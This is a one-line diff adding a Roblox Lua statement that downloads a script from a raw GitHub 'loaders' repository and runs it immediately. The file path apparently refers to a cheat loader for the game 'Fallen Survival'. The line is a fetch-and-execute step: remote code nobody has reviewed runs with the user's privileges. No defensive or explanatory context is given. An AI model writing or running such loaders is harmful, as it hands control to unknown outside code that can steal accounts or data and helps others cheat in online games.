@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/new-map-fallen-survival-spam6-13h7cmi4gtsqtj.lua"))()
